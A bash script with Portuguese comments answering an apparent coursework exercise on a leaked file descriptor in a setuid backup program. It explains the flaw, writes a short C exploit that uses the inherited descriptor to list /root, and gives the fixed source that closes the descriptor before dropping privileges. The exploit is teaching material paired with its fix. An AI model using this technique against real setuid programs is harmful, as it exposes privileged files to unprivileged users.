#!/bin/bash

# Exercício 1
gcc -Wall -Wextra -o backupssi backupssi.c
./backupssi

# Exercício 2
# O problema aqui é que, apesar de no início o programa abrir /root com os privilégios adequados,
# o file descriptor continua aberto quando estes privilégios são removidos (setuid(getuid())), 
# o que significa que a shell herda esse acesso a /root. 
# O utilizador (sem privilégios), com essa shell, consegue ter acesso assim, à diretoria, quando isso não devia ser possível.

# Exercício 3
cat << 'EOF' > exploit.c
#include <stdio.h>
#include <dirent.h> // Para ler o conteúdo de diretorias
#include <unistd.h>

int main()
{
	DIR *d;
	struct dirent *dir;

	d = fdopendir(3); // Usa-se o file descriptor herdado (verificado no output da alínea anterior)
	if (d == NULL)
	{
		perror("fopendir");
		return 1;
	}

	printf("Conteúdo de /root:\n");
	
	while ((dir = readdir(d)) != NULL)
	{
		printf("%s\n", dir->d_name); // Listar os ficheiros da diretoria
	}

	closedir(d);
	return 0;
}
EOF

gcc -o exploit exploit.c

# Exercício 4
# Solução: fechar o file descriptor antes de retirar os privilégios.
# Ao fechar o fd antes de chamar setuid e execve, nada que seja privilegiado é herdado pela nova shell.
# O utilizador normal não consegue aceder, assim, à diretoria /root.

cat << 'EOF' > backupssi.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main()
{
	int dfd;
	char *argv[2];

	dfd = open("/root", O_RDONLY);
	if (dfd == -1) {
		perror("open /root");
		exit(1);
	}
	printf("Directory FD is %d\n", dfd);

	if (mkdir("/root/backupssi", 0700) == -1) {
		perror("mkdir /root/backupssi");
	}

	close(dfd); // correção aqui!

	if (setuid(getuid()) == -1) {
		perror("setuid");
		exit(1);
	}

	argv[0] = "/bin/sh";
	argv[1] = NULL;
	execve(argv[0], argv, NULL);

	perror("execve");
	return 0;
}
